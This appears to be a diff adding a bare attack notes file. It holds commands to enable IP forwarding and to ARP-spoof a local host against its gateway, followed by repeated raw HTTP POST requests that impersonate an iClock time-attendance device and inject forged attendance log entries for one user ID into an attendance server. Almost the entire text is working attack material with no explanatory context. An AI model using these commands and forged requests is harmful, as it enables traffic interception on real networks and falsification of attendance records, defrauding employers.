@@ -1,0 +1,84 @@
+echo 1 >/proc/sys/net/ipv4/ip_forward
+
+cat /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i enp4s0 -t 10.115.24.236 10.115.24.1
+
+
+
+
+
+
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+Content-Length: 36
+
+22113        2019-02-01 18:12:37        0        15                0        0
+
+
+
+GET /iclock/getrequest?SN=3394171701181 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+Content-Length: 36
+
+22113        2019-02-01 18:12:37        0        15                0        0
+
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+Content-Length: 36
+
+22113        2019-02-01 18:12:37        0        15                0        0
+
+
+
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+Content-Length: 36
+
+22113        2019-02-01 18:12:37        0        15                0        0
+
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1
+Host: 10.115.131.221:8001
+User-Agent: iClock Proxy/1.09
+Connection: close
+Accept: */*
+Content-Length: 36
+
+22113        2019-02-01 18:10:18        1        15                0        0
+
+
+POST /iclock/cdata?SN=3394171701181&table=ATTLOG&Stamp=9999 HTTP/1.1 
+Host: 10.115.131.221:8001 
+User-Agent: iClock Proxy/1.09 
+Connection: close 
+Accept: */* 
+Content-Length: 36 
+
+22113        2019-02-01 18:12:37        0        15                0        0
